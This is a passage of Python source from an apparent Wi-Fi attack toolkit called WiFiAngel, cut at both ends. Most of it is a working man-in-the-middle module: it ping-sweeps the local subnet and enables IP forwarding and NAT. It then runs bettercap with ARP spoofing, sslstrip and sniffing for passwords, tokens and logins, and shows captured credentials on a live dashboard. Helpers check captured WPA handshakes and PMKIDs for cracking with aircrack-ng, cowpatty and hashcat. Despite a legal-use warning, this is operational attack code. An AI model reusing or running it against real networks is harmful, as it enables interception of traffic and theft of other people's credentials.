                progress.update(upload_task, visible=True)
                
                # Upload test uses a small file and estimates real-world throughput from it.
                upload_start_time = time.time()
                test_file = None
                
                try:
                    with tempfile.NamedTemporaryFile(
                        prefix="speedtest_",
                        suffix=".dat",
                        dir="/tmp",
                        delete=False,
                    ) as upload_file:
                        upload_file.write(os.urandom(UPLOAD_TEST_BYTES))
                        test_file = upload_file.name
                    
                    # Show some initial progress
                    for i in range(30):
                        progress.update(upload_task, completed=i)
                        time.sleep(0.02)
                    
                    # Run the actual upload test
                    result = self.command_runner.run(
                        curl_upload_command(test_file),
                        stdout=subprocess.DEVNULL, 
                        stderr=subprocess.DEVNULL,
                        timeout=8
                    )
                    
                    # Show more progress during upload
                    for i in range(30, 70):
                        progress.update(upload_task, completed=i)
                        time.sleep(0.02)
                    
                    # Calculate upload time
                    upload_time = time.time() - upload_start_time
                    
                    if result.ok:
                        upload_speed = estimate_upload_mbytes_per_second(
                            UPLOAD_TEST_BYTES,
                            upload_time,
                        )
                    else:
                        self.logger.warning("Upload test failed")
                        upload_speed = fallback_upload_mbytes_per_second(download_speed)
                        
                except Exception as e:
                    # Log the error but don't show to user
                    self.logger.warning(f"Upload test error: {str(e)}")
                    upload_time = time.time() - upload_start_time
                    upload_speed = fallback_upload_mbytes_per_second(download_speed)
                finally:
                    if test_file:
                        try:
                            os.remove(test_file)
                        except OSError:
                            pass
                
                # Complete the progress bar
                for i in range(70, 101):
                    progress.update(upload_task, completed=i)
                    time.sleep(0.01)
            
            # Ping test
            ping_result = self.command_runner.run(
                ping_command(count=5, quiet=True),
                capture_output=True,
                text=True,
            )
            ping_stats = parse_ping_stats(ping_result.stdout if ping_result.ok else "")
            
            # Show results
            self.console.print("\n[bold green]✓ Speed Test Completed![/]")
            
            # Results table
            result_table = Table(show_header=True, header_style="bold magenta", 
                                title="[bold blue]Network Speed Test Results[/]")
            result_table.add_column("Test", style="cyan", justify="center")
            result_table.add_column("Result", style="green", justify="center")
            result_table.add_column("Details", style="yellow", justify="center")
            
            # Download
            download_mbps = mbytes_to_mbits(download_speed)
            result_table.add_row(
                "📥 Download",
                f"{download_mbps:.2f} Mbps",
                f"({download_speed:.2f} MB/s)"
            )
            
            # Upload
            upload_mbps = mbytes_to_mbits(upload_speed)
            result_table.add_row(
                "📤 Upload",
                f"{upload_mbps:.2f} Mbps",
                f"({upload_speed:.2f} MB/s)"
            )
            
            # Ping
            if ping_stats:
                result_table.add_row(
                    "🔄 Ping",
                    f"{ping_stats.average_ms:.2f} ms",
                    f"min/avg/max = {ping_stats.raw} ms"
                )
            else:
                result_table.add_row(
                    "🔄 Ping",
                    "N/A",
                    "Could not measure ping"
                )
            
            self.console.print(result_table)
            
            # Visual speed gauges
            self.console.print("\n[bold cyan]Speed Gauges:[/]")
            
            # Download speed gauge
            download_blocks = speed_gauge_blocks(download_mbps, 100)
            download_gauge = f"Download: [green]{'█' * download_blocks}{'░' * (10 - download_blocks)}[/] {download_mbps:.2f} Mbps"
            download_rating = download_speed_rating(download_mbps)
                
            self.console.print(f"{download_gauge} - {download_rating}")
            
            # Upload speed gauge
            upload_blocks = speed_gauge_blocks(upload_mbps, 50)
            upload_gauge = f"Upload:   [blue]{'█' * upload_blocks}{'░' * (10 - upload_blocks)}[/] {upload_mbps:.2f} Mbps"
            upload_rating = upload_speed_rating(upload_mbps)
                
            self.console.print(f"{upload_gauge} - {upload_rating}")
            
            # Recommendations
            recommendations = build_speed_recommendations(
                download_mbps,
                upload_mbps,
                ping_stats.average_ms if ping_stats else None,
            )
                
            if recommendations:
                self.console.print("\n[bold red]Recommendations:[/]")
                for rec in recommendations:
                    self.console.print(f"[yellow]- {rec}[/]")
            else:
                self.console.print("\n[bold green]✓ Your internet connection is performing well![/]")
                
        except Exception as e:
            self.console.print(f"[bold red]Error during speed test: {str(e)}[/]")
        
        self.console.print("\n[bold blue]Press Enter to return to the menu...[/]")
        input()
        return

    def _restore_settings(self, original_ip_forward, original_iptables, bettercap_process=None):
        """Helper to restore system settings after MITM attack"""
        self.console.print("[bold blue]Restoring system settings...[/]")
        
        # Stop BetterCAP if it's running
        if bettercap_process:
            try:
                bettercap_process.terminate()
                try:
                    bettercap_process.wait(timeout=5)
                except subprocess.TimeoutExpired:
                    bettercap_process.kill()
                self.console.print("[green]BetterCAP stopped[/]")
            except:
                self.console.print("[yellow]Failed to stop BetterCAP gracefully[/]")
        
        # Kill any remaining BetterCAP processes
        self.command_runner.run(
            ["pkill", "-9", "-f", "bettercap"],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )
        
        # Restore IP forwarding
        if original_ip_forward is not None:
            try:
                self.command_runner.run(
                    ["sysctl", f"net.ipv4.ip_forward={original_ip_forward}"],
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL,
                )
                self.console.print("[green]IP forwarding restored[/]")
            except:
                self.console.print("[red]Failed to restore IP forwarding[/]")
        
        # Restore iptables rules
        if original_iptables:
            try:
                self.command_runner.run(["iptables-restore"], input=original_iptables, text=True)
                self.console.print("[green]Firewall rules restored[/]")
            except:
                # Fallback: just flush all rules
                try:
                    self.command_runner.run(["iptables", "-F"])
                    self.command_runner.run(["iptables", "-t", "nat", "-F"])
                    self.console.print("[yellow]Firewall rules flushed[/]")
                except:
                    self.console.print("[red]Failed to restore firewall rules[/]")

    def _format_bytes(self, bytes_value):
        """Convert bytes to human-readable format"""
        bytes_value = float(bytes_value)
        if bytes_value < 1024:
            return f"{bytes_value:.0f} B"
        elif bytes_value < 1024**2:
            return f"{bytes_value/1024:.2f} KB"
        elif bytes_value < 1024**3:
            return f"{bytes_value/(1024**2):.2f} MB"
        else:
            return f"{bytes_value/(1024**3):.2f} GB"

    def get_mac(self, ip, interface):
        """Get MAC address of any device on the same network"""
        def read_arp_cache():
            try:
                output = self.command_runner.check_output(
                    arp_lookup_command(ip),
                    stderr=subprocess.DEVNULL,
                    text=True,
                )
            except Exception as e:
                self.logger.debug(f"ARP cache lookup failed for {ip}: {str(e)}")
                return None

            return parse_mac_from_arp_output(output)

        try:
            # First try ARP cache
            mac_address = read_arp_cache()
            if mac_address:
                return mac_address
            
            # If not in cache, try to ping to update ARP cache
            self.command_runner.run(
                ping_probe_command(ip),
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
            )
            
            mac_address = read_arp_cache()
            if mac_address:
                return mac_address
            
            # If still not found, use scapy
            ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip), 
                       timeout=2, 
                       iface=interface, 
                       verbose=0)
            
            if ans:
                return ans[0][1].hwsrc
            
            return None
        except Exception as e:
            self.logger.error(f"Error getting MAC address: {str(e)}")
            return None

    def start_bettercap(self, interface, target_ip, gateway, script_path=None):
        """Start BetterCAP for MITM attacks with error handling"""
        try:
            # First ensure BetterCAP is not running
            self.console.print("[bold yellow]Stopping any running BetterCAP instances...[/]")
            self.command_runner.run(
                ["pkill", "-9", "-f", "bettercap"],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
            )
            time.sleep(3)  # Wait longer for processes to fully terminate
            
            cmd = bettercap_command(interface, script_path)
                
            self.console.print(f"[bold blue]Starting BetterCAP with command: {' '.join(cmd)}[/]")
            
            # Start BetterCAP with proper output redirection
            process = self.command_runner.popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True,
                bufsize=1,
                universal_newlines=True,
                env=dict(os.environ, LC_ALL="C")  # Ensure stable output encoding
            )
            if process is None:
                return None
            
            # Give BetterCAP more time to start
            time.sleep(5)
            
            # Check if process started correctly
            if process.poll() is not None:
                # Process exited already
                stdout, stderr = process.communicate()
                if stderr:
                    self.console.print(f"[bold red]Error starting BetterCAP: {stderr}[/]")
                return None
                
            # Use a direct command to verify ARP spoofing is active
            try:
                self.console.print("[bold blue]Verifying ARP spoofing status...[/]")
                # Enhanced method to verify ARP spoofing
                if os.path.exists("/proc/net/arp"):
                    with open("/proc/net/arp", "r") as arp_table:
                        arp_entries = arp_table.read()
                        # Check if we have multiple entries for the same IP
                        # which can indicate ARP spoofing is working
                        self.console.print("[green]ARP table verification complete[/]")
                else:
                    self.console.print("[yellow]Could not verify ARP spoofing status[/]")
            except Exception as e:
                self.console.print(f"[yellow]Could not verify ARP spoofing: {str(e)}[/]")
            
            # Force start ARP spoofing with direct commands to ensure it works
            try:
                # Direct command to force ARP spoofing
                self.command_runner.run(
                    bettercap_stdin_eval_command(interface),
                    input="arp.spoof on\n",
                    text=True,
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL,
                )
                self.console.print("[bold green]Manually activated ARP spoofing[/]")
            except:
                pass
                
            return process
            
        except Exception as e:
            self.console.print(f"[bold red]Error starting BetterCAP: {str(e)}[/]")
            return None

    def _stream_output_to_file(self, process, file):
        """Helper method to stream process output to a file"""
        try:
            if process and process.stdout and not process.stdout.closed:
                for line in iter(process.stdout.readline, ''):
                    if line and file and not file.closed:
                        try:
                            file.write(line)
                            file.flush()
                        except (ValueError, IOError):
                            break
        except Exception as e:
            # Silently handle errors - we don't want to crash the thread
            pass
        finally:
            # Make sure we close stdout if it's still open
            if process and process.stdout and not process.stdout.closed:
                try:
                    process.stdout.close()
                except:
                    pass

    def _verify_handshake(self, cap_file, bssid, ssid=None):
        """Thoroughly verify if a handshake file contains a valid handshake
        
        Args:
            cap_file: Path to the capture file
            bssid: BSSID of the target network
            ssid: SSID of the target network (optional)
            
        Returns:
            bool: True if valid handshake found, False otherwise
        """
        try:
            self.logger.info(f"Verifying handshake in {cap_file}")
            
            # Method 1: Check with aircrack-ng
            aircrack_result = subprocess.run(aircrack_check(cap_file), capture_output=True, text=True)
            
            # Method 2: Check with Pyrit if available
            pyrit_verification = False
            try:
                pyrit_cmd = ["pyrit", "-r", str(cap_file), "analyze"]
                pyrit_result = subprocess.run(pyrit_cmd, capture_output=True, text=True)
                if "handshake(s)" in pyrit_result.stdout:
                    pyrit_verification = True
                    self.logger.info("Pyrit verified handshake")
            except:
                # Pyrit not installed or other error, proceed with aircrack verification
                self.logger.debug("Pyrit verification failed or not available")
                pass
            
            # Method 3: Check with cowpatty if available
            cowpatty_verification = False
            if ssid:
                try:
                    cowpatty_cmd = ["cowpatty", "-c", "-r", str(cap_file), "-s", ssid]
                    cowpatty_result = subprocess.run(cowpatty_cmd, capture_output=True, text=True)
                    if "Collected all necessary data to mount crack against WPA" in cowpatty_result.stdout:
                        cowpatty_verification = True
                        self.logger.info("Cowpatty verified handshake")
                except:
                    # Cowpatty not installed or other error
                    self.logger.debug("Cowpatty verification failed or not available")
                    pass
            
            # Check if we have at least one positive verification
            has_handshake = False
            
            # Primary verification with aircrack-ng
            if has_aircrack_handshake(aircrack_result.stdout, bssid):
                has_handshake = True
                self.logger.info("Aircrack-ng verified handshake")
            
            # If any verification method succeeded, consider it valid
            verified = has_handshake or pyrit_verification or cowpatty_verification
            
            if verified:
                self.logger.info(f"Handshake verification successful")
                return True
            else:
                self.logger.warning(f"Handshake verification failed")
                return False
                
        except Exception as e:
            self.logger.error(f"Error verifying handshake: {str(e)}")
            return False
            
    def _verify_pmkid(self, pmkid_file, bssid):
        """Verify if a PMKID file contains a valid PMKID for the target network
        
        Args:
            pmkid_file: Path to the PMKID file (usually .22000 format)
            bssid: BSSID of the target network
            
        Returns:
            bool: True if valid PMKID found, False otherwise
        """
        try:
            self.logger.info(f"Verifying PMKID in {pmkid_file}")
            
            # Check if file exists and has content
            pmkid_path = Path(pmkid_file)
            if not pmkid_path.exists() or pmkid_path.stat().st_size == 0:
                self.logger.warning("PMKID file is empty or does not exist")
                return False
            
            # Read file content to check if it contains the target BSSID
            with open(pmkid_path, 'r', errors='ignore') as f:
                content = f.read()
                
                # Convert BSSID to different formats that might appear in PMKID file
                bssid_parts = bssid.split(':')
                if len(bssid_parts) == 6:
                    bssid_no_colons = ''.join(bssid_parts)
                    bssid_formats = [
                        bssid.lower(),
                        bssid.upper(),
                        bssid_no_colons.lower(),
                        bssid_no_colons.upper()
                    ]
                    
                    # Check if any BSSID format is in the file content
                    for bssid_format in bssid_formats:
                        if bssid_format in content:
                            self.logger.info(f"PMKID verification successful - found BSSID {bssid_format}")
                            return True
            
            # Verify with hashcat info if available
            try:
                hashcat_cmd = ["hashcat", "--show", "-m", "22000", str(pmkid_file)]
                hashcat_result = subprocess.run(hashcat_cmd, capture_output=True, text=True)
                if bssid.replace(':', '').lower() in hashcat_result.stdout.lower():
                    self.logger.info("Hashcat verified PMKID")
                    return True
            except:
                # Hashcat not installed or other error
                pass
                
            # Run hcxpcapngtool in info mode to check
            try:
                hcx_cmd = hcxpcapngtool_info(str(pmkid_file).replace('.22000', '.pcapng'))
                hcx_result = subprocess.run(hcx_cmd, capture_output=True, text=True)
                if bssid.lower() in hcx_result.stdout.lower():
                    self.logger.info("hcxpcapngtool verified PMKID")
                    return True
            except:
                # Command failed or not installed
                pass
                
            self.logger.warning(f"PMKID verification failed - BSSID not found in file")
            return False
            
        except Exception as e:
            self.logger.error(f"Error verifying PMKID: {str(e)}")
            return False

    def mitm_attack(self):
            """Man in the Middle attack with ARP spoofing and packet capture"""
            # Check if running as root
            if os.geteuid() != 0:
                self.console.print("[bold red]This attack requires root privileges![/]")
                return
                
            # Verify requirements
            if not shutil.which("bettercap"):
                self.console.print("[bold red]bettercap is required for this attack![/]")
                self.console.print("To install: sudo apt-get install bettercap")
                return
            
            # ====== INFORMATION AND WARNING SECTION ======
            self.console.clear()
            warning_panel = Panel(
                Group(
                    Text("⚠️ Man-in-the-Middle Attack Warning ⚠️", justify="center"),
                    Text(""),
                    Text("- This attack intercepts network traffic between clients and the gateway"),
                    Text("- All data passing through the network will be captured and analyzed"),
                    Text("- Passwords and sensitive information may be exposed"),
                    Text("- This tool should ONLY be used on networks you own or have permission to test"),
                    Text("- Unauthorized use is illegal and may result in criminal prosecution"),
                    Text(""),
                    Text("DISCLAIMER: Use at your own risk. You are responsible for your actions.", justify="center"),
                    Text(""),
                    Text("Press ENTER to continue or CTRL+C to cancel", justify="center")
                ),
                title="[bold white]WiFiAngel - MITM Attack Module[/]",
                border_style="yellow"
            )
            
            self.console.print(warning_panel)
            try:
                input()  # Wait for ENTER to continue
            except KeyboardInterrupt:
                self.console.print("\n[bold yellow]Attack cancelled by user.[/]")
                return
            
            # Get network interfaces with IP and Gateway
            interfaces = {}
            gateways = {}
            
            try:
                # Get interfaces with valid IPs
                for interface in netifaces.interfaces():
                    # Skip loopback
                    if interface == 'lo':
                        continue
                        
                    # Get interface addresses
                    addrs = netifaces.ifaddresses(interface)
                    if netifaces.AF_INET in addrs:
                        ip = addrs[netifaces.AF_INET][0]['addr']
                        # Skip interfaces without valid IPs
                        if ip.startswith('127.') or not re.match(r'\d+\.\d+\.\d+\.\d+', ip):
                            continue
                        interfaces[interface] = ip
                
                # Get default gateway
                gateway_info = netifaces.gateways()
                if 'default' in gateway_info and netifaces.AF_INET in gateway_info['default']:
                    gw_info = gateway_info['default'][netifaces.AF_INET]
                    gateways[gw_info[1]] = gw_info[0]  # interface: gateway_ip
            except Exception as e:
                self.console.print(f"[bold red]Error getting network information: {str(e)}[/]")
                return
                
            # Let user choose network interface
            self.console.clear()
            
            interface_panel = Panel(
                Group(
                    Text("Select Network Interface for Attack", justify="center"),
                    Text(""),
                    *(Text(f"[{i}] {iface} - IP: {ip} - Gateway: {gateways.get(iface, 'Unknown')}") 
                      for i, (iface, ip) in enumerate(interfaces.items(), 1)),
                    Text(""),
                    Text("Enter the interface number or 0 to cancel:", justify="center")
                ),
                title="Available Network Interfaces",
                border_style="blue"
            )
            
            self.console.print(interface_panel)
            
            choice = Prompt.ask("Interface", choices=["0"] + [str(i) for i in range(1, len(interfaces) + 1)])
            if choice == "0":
                return
                
            selected_iface = list(interfaces.keys())[int(choice) - 1]
            selected_ip = interfaces[selected_iface]
            selected_gateway = gateways.get(selected_iface, None)
            
            if not selected_gateway:
                self.console.print(f"[bold red]No gateway found for interface {selected_iface}![/]")
                return
            
            # Scan local network to find targets
            self.console.print("[bold cyan]Scanning network for available targets...[/]")
            
            # Simple network scan using ping sweep
            network_prefix = ".".join(selected_ip.split(".")[:3]) + "."
            online_hosts = {}
            
            with Progress() as progress:
                scan_task = progress.add_task("[cyan]Scanning network...", total=254)
                
                for i in range(1, 255):
                    progress.update(scan_task, advance=1)
                    ip = f"{network_prefix}{i}"
                    
                    # Skip our IP
                    if ip == selected_ip:
                        continue
                        
                    # Try to ping the host
                    try:
                        result = subprocess.run(
                            ["ping", "-c", "1", "-W", "0.2", ip],
                            stdout=subprocess.DEVNULL,
                            stderr=subprocess.DEVNULL,
                            timeout=0.5
                        )
                        if result.returncode == 0:
                            # Try to get hostname
                            try:
                                hostname = socket.gethostbyaddr(ip)[0]
                            except:
                                hostname = "Unknown"
                                
                            # Try to get MAC
                            try:
                                mac = self.get_mac(ip, selected_iface)
                            except:
                                mac = "Unknown"
                                
                            online_hosts[ip] = {"hostname": hostname, "mac": mac}
                    except:
                        pass
            
            # Present target selection options
            target_panel = Panel(
                Group(
                    Text("Select Target for MITM Attack", justify="center"),
                    Text(""),
                    Text("[1] All network traffic (entire network)"),
                    *(Text(f"[{i+2}] {ip} - {info['hostname']} ({info['mac']})") 
                      for i, (ip, info) in enumerate(online_hosts.items())),
                    Text(""),
                    Text("Enter target number or 0 to cancel:", justify="center")
                ),
                title="[bold white]Available Targets[/]",
                border_style="green"
            )
            
            self.console.print(target_panel)
            
            target_choices = ["0", "1"] + [str(i) for i in range(2, len(online_hosts) + 2)]
            target_choice = Prompt.ask("Target", choices=target_choices)
            
            if target_choice == "0":
                return
                
            if target_choice == "1":
                # Target entire network
                target_ip = ""
                target_desc = "Entire Network"
            else:
                # Target specific host
                target_ip = list(online_hosts.keys())[int(target_choice) - 2]
                target_desc = f"{target_ip} - {online_hosts[target_ip]['hostname']}"
            
            # Final confirmation
            confirm_panel = Panel(
                Group(
                    Text("Ready to Start MITM Attack", justify="center"),
                    Text(""),
                    Text(f"Interface: {selected_iface}"),
                    Text(f"Local IP:  {selected_ip}"),
                    Text(f"Gateway:   {selected_gateway}"),
                    Text(f"Target:    {target_desc}"),
                    Text(""),
                    Text("This attack will intercept network traffic."),
                    Text("Press ENTER to start or CTRL+C to cancel", justify="center")
                ),
                title="[bold white]Attack Confirmation[/]",
                border_style="yellow"
            )
            
            self.console.print(confirm_panel)
            
            try:
                input()  # Wait for ENTER to continue
            except KeyboardInterrupt:
                self.console.print("\n[bold yellow]Attack cancelled by user.[/]")
                return
            
            # Set up logs directory
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            log_dir = Path(f"logs/mitm/{timestamp}")
            log_dir.mkdir(parents=True, exist_ok=True)
            
            # Log files
            password_log = log_dir / "passwords.txt"
            traffic_log = log_dir / "traffic.txt"
            http_log = log_dir / "http.log"
            dns_log = log_dir / "dns.log"
            sensitive_log = log_dir / "sensitive_data.log"
            
            # Create bettercap script
            bettercap_script = log_dir / "bettercap.cap"
            bettercap_options = f"""set net.sniff.verbose true
set net.sniff.local true
set net.sniff.filter tcp
net.sniff on
set http.proxy.sslstrip true
any.proxy on
https.proxy on
set net.sniff.patterns password,login,passwd,auth,secret,token,user,admin
events.stream on
set events.stream.output {log_dir}/events.log
set http.proxy.http_log {http_log}
set http.proxy.password_log {password_log}
set dns.spoof.all false
net.recon on
arp.spoof on"""
    
            # Add target if specific host
            if target_ip:
                bettercap_options += f"\n\nset arp.spoof.targets {target_ip}"
            
            with open(bettercap_script, "w") as f:
                f.write(bettercap_options)
            
            # Create sensitive data log file
            with open(sensitive_log, "w") as f:
                f.write(f"# Sensitive data log started at {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                f.write(f"# Monitoring for patterns: password,login,passwd,auth,secret,token,user,admin\n\n")
            
            # Enable IP forwarding and set up iptables
            self.console.print(f"\n[bold green]Man in the Middle Attack Setup[/]")
            self.console.print(f"[bold cyan]Preparing attack on {target_desc} via {selected_iface}...[/]")
            
            # Save original settings
            original_ip_forward = None
            original_iptables = []
            
            try:
                # Read original IP forwarding setting
                with open("/proc/sys/net/ipv4/ip_forward", "r") as f:
                    original_ip_forward = f.read().strip()
                    
                # Get original iptables rules
                result = subprocess.run(["iptables", "-t", "nat", "-S"], capture_output=True, text=True)
                original_iptables = result.stdout
                
                # Enable IP forwarding
                self.console.print("[bold blue]Enabling IP forwarding...[/]")
                subprocess.run(["sysctl", "-w", "net.ipv4.ip_forward=1"], stdout=subprocess.DEVNULL)
                
                # Set up traffic forwarding rules
                self.console.print("[bold blue]Setting up traffic forwarding rules...[/]")
                subprocess.run(["iptables", "-t", "nat", "-A", "POSTROUTING", "-o", selected_iface, "-j", "MASQUERADE"], stdout=subprocess.DEVNULL)
                
                # Stop any running BetterCAP instances
                self.console.print("[bold blue]Stopping any running BetterCAP instances...[/]")
                subprocess.run(["pkill", "-f", "bettercap"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                
                # Create traffic log file
                with open(traffic_log, "w") as f:
                    f.write(f"# Traffic log started at {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                    f.write(f"# Interface: {selected_iface}, IP: {selected_ip}, Gateway: {selected_gateway}\n\n")
                
                # Create password log file if it doesn't exist
                if not password_log.exists():
                    with open(password_log, "w") as f:
                        f.write(f"# Password log started at {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n")
                
                # Start bettercap with our script
                self.console.print("[bold green]Starting BetterCAP and preparing attack environment...[/]")
                
                # Create files for BetterCAP output
                bettercap_stdout_file = open(os.path.join(log_dir, "bettercap_stdout.log"), "w")
                bettercap_stderr_file = open(os.path.join(log_dir, "bettercap_stderr.log"), "w")
                
                # Start BetterCAP process
                bettercap_cmd = f"bettercap -iface {selected_iface} -caplet {bettercap_script}"
                bettercap_process = subprocess.Popen(
                    bettercap_cmd.split(),
                    stdout=bettercap_stdout_file,
                    stderr=bettercap_stderr_file,
                    universal_newlines=True
                )
                
                # Give BetterCAP time to initialize
                time.sleep(3)
                
                # Check if process is still running
                if bettercap_process.poll() is not None:
                    # BetterCAP exited early
                    self.console.print("[bold red]BetterCAP failed to start! Please check log files.[/]")
                    if 'bettercap_stdout_file' in locals() and not bettercap_stdout_file.closed:
                        bettercap_stdout_file.close()
                    if 'bettercap_stderr_file' in locals() and not bettercap_stderr_file.closed:
                        bettercap_stderr_file.close()
                    self._restore_settings(original_ip_forward, original_iptables)
                    return
                
                self.console.print("\n[bold white on red]!!! IMPORTANT: Press Ctrl+C to stop the attack when finished !!![/]")
                
                # Create rich layout for visual display
                layout = Layout(name="root")
                
                # Main sections
                layout.split(
                    Layout(name="header", size=3),
                    Layout(name="body"),
                    Layout(name="footer", size=3)
                )
                
                # Body sections - adjust ratio between left and right columns
                layout["body"].split_row(
                    Layout(name="left_column", ratio=4),  # More space for left column
                    Layout(name="right_column", ratio=1)  # Narrow the right column
                )
                
                # Left column sections - adjust ratios between Traffic section and Sensitive Data
                layout["left_column"].split(
                    Layout(name="status", ratio=1),
                    Layout(name="network_traffic", ratio=4),  # More space for Network Traffic
                    Layout(name="sensitive_data", ratio=2)
                )
                
                # Right column sections - more space for clients
                layout["right_column"].split(
                    Layout(name="stats", ratio=1),
                    Layout(name="clients", ratio=3)  # More space for Client table
                )
                
                # Stats for display
                attack_stats = {
                    'start_time': time.time(),
                    'packets': 0,
                    'bytes': 0,
                    'clients': {},
                    'last_traffic': [],
                    'sensitive_matches': []
                }
                
                # Function to update traffic log with latest data
                def update_traffic_log(data):
                    try:
                        with open(traffic_log, "a") as f:
                            f.write(f"{datetime.now().strftime('%H:%M:%S')} - {data}\n")
                    except:
                        pass
                
                # Function to update sensitive data log
                def update_sensitive_log(data):
                    try:
                        with open(sensitive_log, "a") as f:
                            f.write(f"{datetime.now().strftime('%H:%M:%S')} - {data}\n")
                    except:
                        pass
                
                # Live display loop
                with Live(layout, refresh_per_second=2, screen=True) as live:
                    try:
                        while True:
                            # Check if BetterCAP process is still running
                            if bettercap_process.poll() is not None:
                                layout["body"].update(Panel("[bold red]BetterCAP unexpectedly stopped! Attack terminated.[/]"))
                                live.refresh()
                                time.sleep(2)
                                break
                            
                            # Calculate elapsed time
                            elapsed = time.time() - attack_stats['start_time']
                            hours, remainder = divmod(elapsed, 3600)
                            minutes, seconds = divmod(remainder, 60)
                            elapsed_str = f"{int(hours):02d}:{int(minutes):02d}:{int(seconds):02d}"
                            
                            # Update traffic statistics
                            try:
                                # Get interface statistics
                                ifconfig_output = self.command_runner.check_output(["ifconfig", selected_iface])
                                rx_match = re.search(r'RX packets (\d+).*?bytes (\d+)', ifconfig_output, re.DOTALL)
                                if rx_match:
                                    attack_stats['packets'] = int(rx_match.group(1))
                                    attack_stats['bytes'] = int(rx_match.group(2))
                                    
                                # Get client list from ARP table
                                arp_output = self.command_runner.check_output(["arp", "-a"])
                                for line in arp_output.splitlines():
                                    match = re.search(r'\((\d+\.\d+\.\d+\.\d+)\) at ([0-9a-f:]+)', line)
                                    if match:
                                        ip, mac = match.groups()
                                        if mac != "00:00:00:00:00:00" and mac != "ff:ff:ff:ff:ff:ff":
                                            if ip not in attack_stats['clients']:
                                                hostname = "Unknown"
                                                try:
                                                    hostname = socket.gethostbyaddr(ip)[0]
                                                except:
                                                    pass
                                                attack_stats['clients'][ip] = {
                                                    'mac': mac, 
                                                    'first_seen': datetime.now(),
                                                    'hostname': hostname
                                                }
                                                update_traffic_log(f"New client detected: {ip} ({mac}) - {hostname}")
                                
                                # Read BetterCAP events for sensitive data patterns
                                patterns = ["password", "login", "passwd", "auth", "secret", "token", "user", "admin"]
                                
                                # Check for sensitive data in BetterCAP output
                                try:
                                    with open(os.path.join(log_dir, "bettercap_stdout.log"), 'r') as f:
                                        lines = f.readlines()
                                        if lines:
                                            # Get last lines
                                            new_lines = lines[-50:]
                                            for line in new_lines:
                                                # Check for general traffic lines
                                                if any(pattern in line.lower() for pattern in ["http", "tcp", "udp", "dns"]):
                                                    if line not in attack_stats['last_traffic']:
                                                        attack_stats['last_traffic'].append(line)
                                                        update_traffic_log(line.strip())
                                                
                                                # Check specifically for sensitive data
                                                if any(pattern in line.lower() for pattern in patterns):
                                                    if line not in attack_stats['sensitive_matches']:
                                                        attack_stats['sensitive_matches'].append(line)
                                                        update_sensitive_log(line.strip())
                                            
                                            # Keep only last entries
                                            attack_stats['last_traffic'] = attack_stats['last_traffic'][-15:]
                                            attack_stats['sensitive_matches'] = attack_stats['sensitive_matches'][-15:]
                                except:
                                    pass
                            except Exception as e:
                                # Silently handle errors
                                pass
                            
                            # 1. Update Header
                            header = Panel(
                                f"[bold red]Man in the Middle Attack Running[/] - [bold cyan]Elapsed: {elapsed_str}[/] - [bold yellow]Target: {target_desc}[/]",
                                title="[bold white]WiFiAngel MITM Monitor[/]", 
                                subtitle="[bold red]Press Ctrl+C to Stop[/]",
                                border_style="red"
                            )
                            layout["header"].update(header)
                            
                            # 2. Update Status Panel
                            status_data = Table(show_header=False, box=box.SIMPLE)
                            status_data.add_column("Property", style="cyan", justify="right", width=12)
                            status_data.add_column("Value", style="green")
                            
                            status_data.add_row("Interface", f"[bold]{selected_iface}[/]")
                            status_data.add_row("Local IP", f"[bold]{selected_ip}[/]")
                            status_data.add_row("Gateway", f"[bold]{selected_gateway}[/]")
                            status_data.add_row("Status", "[bold green]Active[/]")
                            status_data.add_row("Mode", "[bold yellow]ARP Spoofing[/]")
                            status_data.add_row("Target", f"[bold red]{target_desc}[/]")
                            
                            status_panel = Panel(
                                status_data,
                                title="[bold blue]Attack Status[/]",
                                border_style="blue"
                            )
                            layout["status"].update(status_panel)
                            
                            # 3. Update Network Traffic Panel
                            traffic_table = Table(box=box.SIMPLE, show_header=True)
                            traffic_table.add_column("#", style="dim", width=3)
                            traffic_table.add_column("Traffic", style="green")
                            
                            if attack_stats['last_traffic']:
                                for i, line in enumerate(attack_stats['last_traffic']):
                                    traffic_table.add_row(f"{i+1}", f"{line.strip()}")
                            else:
                                traffic_table.add_row("", "[yellow]Waiting for traffic...[/]")
                                
                            traffic_panel = Panel(
                                traffic_table,
                                title=f"[bold green]Live Network Traffic[/]",
                                border_style="green"
                            )
                            layout["network_traffic"].update(traffic_panel)
                            
                            # 4. Update Sensitive Data Panel
                            sensitive_table = Table(box=box.SIMPLE, show_header=True)
                            sensitive_table.add_column("#", style="dim", width=3)
                            sensitive_table.add_column("Sensitive Data Match", style="red")
                            
                            if attack_stats['sensitive_matches']:
                                for i, line in enumerate(attack_stats['sensitive_matches']):
                                    sensitive_table.add_row(f"{i+1}", f"[bold red]{line.strip()}[/]")
                            else:
                                sensitive_table.add_row("", "[yellow]No sensitive data detected yet...[/]")
                                
                            sensitive_panel = Panel(
                                sensitive_table,
                                title=f"[bold red]Sensitive Data Matches[/]",
                                border_style="red"
                            )
                            layout["sensitive_data"].update(sensitive_panel)
                            
                            # 5. Update Stats Panel
                            stats_table = Table(show_header=True, box=box.SIMPLE)
                            stats_table.add_column("Metric", style="cyan")
                            stats_table.add_column("Value", style="green", justify="right")
                            
                            stats_table.add_row("Running Time", elapsed_str)
                            stats_table.add_row("Packets", f"{attack_stats['packets']:,}")
                            stats_table.add_row("Data", self._format_bytes(attack_stats['bytes']))
                            stats_table.add_row("Active Clients", f"{len(attack_stats['clients']):,}")
                            
                            stats_panel = Panel(
                                stats_table,
                                title="[bold magenta]Attack Statistics[/]",
                                border_style="magenta"
                            )
                            layout["stats"].update(stats_panel)
                            
                            # 6. Update Clients Panel - Daha fazla alan kullanacak şekilde güncellendi
                            clients_table = Table(show_header=True, box=box.SIMPLE)
                            clients_table.add_column("IP", style="cyan")
